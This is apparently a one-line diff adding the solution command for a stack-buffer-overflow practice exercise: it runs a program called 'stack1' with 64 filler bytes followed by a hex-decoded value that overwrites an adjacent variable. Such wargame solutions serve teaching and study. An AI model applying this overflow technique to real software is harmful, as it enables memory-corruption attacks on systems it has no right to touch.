@@ -1,0 +1,1 @@
+./stack1 $(python -c "print('a' * 64 + '64636261'.decode('hex'))")
